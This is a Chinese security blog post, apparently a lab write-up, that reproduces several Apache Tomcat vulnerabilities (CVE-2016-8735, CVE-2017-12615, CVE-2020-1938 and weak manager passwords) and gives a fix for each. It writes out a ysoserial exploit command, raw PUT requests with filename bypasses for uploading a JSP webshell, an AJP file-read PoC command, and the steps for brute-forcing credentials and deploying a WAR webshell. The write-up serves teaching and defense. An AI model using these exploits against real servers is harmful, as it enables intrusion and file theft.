@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Tomcat漏洞汇总 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Tomcat漏洞汇总</h2>
+  <p class="post-date">2020-08-13</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java环境安装</span><br><span class="line">https:&#x2F;&#x2F;www.java.com&#x2F;en&#x2F;download&#x2F;manual.jsp</span><br><span class="line">Tomcat</span><br><span class="line">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class="line">以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。</span><br></pre></td></tr></table></figure>
+
+<p>1、下载并解压</p>
+<img src="/images/tomcat/image-20200811143320510.png" alt="image-20200811143320510" style="zoom:50%;" />
+
+<p>2、双击执行启动服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.156:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200811143448762.png" alt="image-20200811143448762"></p>
+<h4 id="Tomcat结构介绍"><a href="#Tomcat结构介绍" class="headerlink" title="Tomcat结构介绍"></a>Tomcat结构介绍</h4><p>下载解压后存在目录、文件信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bin-----存放Tomcat的脚本文件，例如启动、关闭</span><br><span class="line">conf----Tomcat的配置文件，例如server.xml和web.xml</span><br><span class="line">lib-----存放Tomcat运行需要的库文件（JAR包）</span><br><span class="line">logs----存放Tomcat执行时的LOG文件</span><br><span class="line">temp----存放Tomcat运行时所产生的临时文件</span><br><span class="line">webapps-Web发布目录，默认情况下把Web应用文件放于此目录</span><br><span class="line">work----存放jsp编译后产生的class文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分类实战"><a href="#漏洞分类实战" class="headerlink" title="漏洞分类实战"></a>漏洞分类实战</h3><h4 id="CVE-2016-8735"><a href="#CVE-2016-8735" class="headerlink" title="CVE-2016-8735"></a>CVE-2016-8735</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11 </p>
+<p>Apache Tomcat 8.5.0 to 8.5.6 </p>
+<p>Apache Tomcat 8.0.0.RC1 to 8.0.38 </p>
+<p>Apache Tomcat 7.0.0 to 7.0.72 </p>
+<p>Apache Tomcat 6.0.0 to 6.0.47</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。</p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf/server.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">Listener</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot;</span> <span class="attr">rmiRegistryPortPlatform</span>=<span class="string">&quot;10001&quot;</span> <span class="attr">rmiServerPortPlatform</span>=<span class="string">&quot;10002&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200812101526860.png" alt="image-20200812101526860"></p>
+<p>2、下载对应jar放到lib目录下：</p>
+<ul>
+<li>catalina-jmx-remote.jar要与对应tomcat版本一致<a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/">不同版本下载</a>一般存在extras文件下，如下图所示</li>
+<li><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9">groovy2.3.9</a>下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）</li>
+</ul>
+<p><img src="/images/tomcat/image-20200812102130773.png" alt="image-20200812102130773"></p>
+<p><img src="/images/tomcat/image-20200811163431177.png" alt="image-20200811163431177"></p>
+<p>3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=<span class="keyword">false</span> -Dcom.sun.management.jmxremote.authenticate=<span class="keyword">false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</li>
+<li>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</li>
+</ul>
+<p><img src="/images/tomcat/image-20200812101910590.png" alt="image-20200812101910590"></p>
+<p>4、服务启动</p>
+<p>下图所示：服务已启动10001端口已启动</p>
+<p><img src="/images/tomcat/image-20200812103050881.png" alt="image-20200812103050881"></p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、执行以下PoC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <span class="number">192.168</span>.<span class="number">3.165</span> <span class="number">10001</span> Groovy1 calc.exe</span><br></pre></td></tr></table></figure>
+
+<p>Java 1.8出现报错</p>
+<p><img src="/images/tomcat/image-20200812104703039.png" alt="image-20200812104703039"></p>
+<p>1.7的jdk成功弹出计算器</p>
+<p><img src="/images/tomcat/PoC.gif" alt="PoC"></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。</p>
+<p>升级jdk（目前测试1.8是无法利用）</p>
+<p>推荐方案：官方已经发布了版本更新，建议您升级到最新版本。</p>
+<ul>
+<li><p>Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)</p>
+</li>
+<li><p>Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)</p>
+</li>
+<li><p>Apache Tomcat 8.0.39或更新版本</p>
+</li>
+<li><p>Apache Tomcat 7.0.73或更新版本</p>
+</li>
+<li><p>Apache Tomcat 6.0.48或更新版本</p>
+</li>
+</ul>
+<h4 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>Apache Tomcat 7.0.0 – 7.0.79</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端</p>
+<p>默认<code>readonly</code>为<code>true</code>，也就是无法进行PUT、DELETE行为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conf&#x2F;web.xml		&#x2F;&#x2F;文件内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813095843352.png" alt="image-20200813095843352"></p>
+<p>这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：</p>
+<p><img src="/images/tomcat/image-20200813100218371.png" alt="image-20200813100218371"></p>
+<p>可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。</p>
+<p>绕过方式：</p>
+<p>Windows：<br>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p>
+<h5 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p><code>readonly</code>设置为<code>false</code>时会导致攻击者上传任意恶意文件。</p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>漏洞环境使用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615">P牛docker</a>镜像验证。</p>
+<p>Tomcat version: 8.5.19</p>
+<p><img src="/images/tomcat/image-20200813140738965.png" alt="image-20200813140738965"></p>
+<p>将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。</p>
+<p>1、readonly默认值为true，手动将其改为false，在<code>conf/web.xml</code>中手动添加红色方框类内容。</p>
+<p>添加如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813100605923.png" alt="image-20200813100605923"></p>
+<p>2、修改请求头并传递post数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.49:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813131648712.png" alt="image-20200813131648712"></p>
+<p>由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。</p>
+<p>此时可以利用上面介绍的绕过方式</p>
+<p>利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.49:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>下图所示修改shell.jsp/即可上传成功</p>
+<p><img src="/images/tomcat/image-20200813131744168.png" alt="image-20200813131744168"></p>
+<p>文件访问</p>
+<p><img src="/images/tomcat/image-20200813133423171.png" alt="image-20200813133423171"></p>
+<p>shell管理</p>
+<p><img src="/images/tomcat/image-20200813134428832.png" alt="image-20200813134428832"></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、删除web.xml文件中readonly属性的值为true或直接删除</p>
+<p>2、更新至官方最新</p>
+<h4 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>CVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。</p>
+<p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
+<h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>Apache Tomcat 6</p>
+<p>Apache Tomcat 7 &lt; 7.0.100</p>
+<p>Apache Tomcat 8 &lt; 8.5.51</p>
+<p>Apache Tomcat 9 &lt; 9.0.31</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
+<h5 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无条件（漏洞环境<a target="_blank" rel="noopener" href="https://github.com/0nise/CVE-2020-1938">参考</a>zip解压并执行）</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813153350723.png" alt="image-20200813153350723"></p>
+<p>2、端口号检测</p>
+<p><img src="/images/tomcat/image-20200813153640165.png" alt="image-20200813153640165"></p>
+<p>由上可以知道目标主机开放8009端口号。</p>
+<p>3、PoC读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813153702055.png" alt="image-20200813153702055"></p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、下载最新</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class="line">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-80.cgi</span><br><span class="line">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-90.cgi</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;tomcat&#x2F;releases</span><br></pre></td></tr></table></figure>
+
+<p>2、临时禁用AJP协议端口，</p>
+<p>在conf/server.xml</p>
+<p><code>注释此行&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p>
+<p><img src="/images/tomcat/image-20200813154014736.png" alt="image-20200813154014736"></p>
+<h4 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。</p>
+<h5 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h5><p>所有版本</p>
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>口令设置较弱，可直接爆破。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf/tomcat-users.xml(添加一行即可)</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;tomcat&quot;</span> <span class="attr">password</span>=<span class="string">&quot;tomcat&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-status,manager-gui,manager-script,manager-jmx&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞条件-3"><a href="#漏洞条件-3" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无条件</p>
+<h5 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813163502206.png" alt="image-20200813163502206"></p>
+<p>2、点击“Server Status”</p>
+<p><img src="/images/tomcat/image-20200813163542988.png" alt="image-20200813163542988"></p>
+<p>3、尝试爆破</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/magicming200/tomcat-weak-password-scanner">脚本</a></p>
+<p><img src="/images/tomcat/image-20200813163718308.png" alt="image-20200813163718308"></p>
+<p>4、生成war包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  server jar -cvf  shell.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813163839974.png" alt="image-20200813163839974"></p>
+<p>5、部署war包</p>
+<p><img src="/images/tomcat/image-20200813164753751.png" alt="image-20200813164753751"></p>
+<p>6、访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;shell&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/tomcat/image-20200813164812341.png" alt="image-20200813164812341"></p>
+<p><img src="/images/tomcat/image-20200813164838466.png" alt="image-20200813164838466"></p>
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、设置强壮密码</p>
+<p>2、平时不用，不允许登录</p>
+<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p><a target="_blank" rel="noopener" href="https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute">Weak_password_brute</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py">CVE-2020-1938</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;tomcat</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5610</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0nise&#x2F;CVE-2020-1938</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Tomcat" >
+    <span class="tag-code">Tomcat</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/07/27/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A/">
+        <span class="nav-arrow">← </span>
+        
+          应用程序接口(API)数据安全研究报告
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/08/20/Mac%E7%B3%BB%E7%BB%9F%E4%BF%AE%E5%A4%8D%E5%8F%8A%E5%8F%8D%E6%80%9D/">
+        
+          Mac系统修复及反馈
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">介绍</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">环境搭建</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Tomcat%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">Tomcat结构介绍</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E5%AE%9E%E6%88%98"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">漏洞分类实战</span></a><ol class="toc-nav-child"><li 